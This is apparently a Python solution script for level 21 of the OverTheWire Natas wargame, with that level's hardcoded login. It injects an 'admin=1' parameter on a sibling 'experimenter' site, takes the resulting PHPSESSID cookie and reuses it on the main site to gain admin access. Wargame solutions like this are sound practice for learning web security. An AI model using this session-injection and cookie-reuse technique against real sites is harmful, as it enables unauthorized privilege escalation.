import requests

auth = ('natas21', 'IFekPyrQXftziDEsUr3x21sYuahypdgJ')
data = {
        'align': 'center',
        'fontsize': '100%',
        'bgcolor': 'yellow',
        'submit': 'Update',
}

req = requests.post('http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug&admin=1', data=data, auth=auth)
cookie = req.cookies.get('PHPSESSID')
print(req.text)

r = requests.get('http://natas21.natas.labs.overthewire.org/', cookies={'PHPSESSID': cookie}, auth=auth)
print(r.status_code)
print(r.text)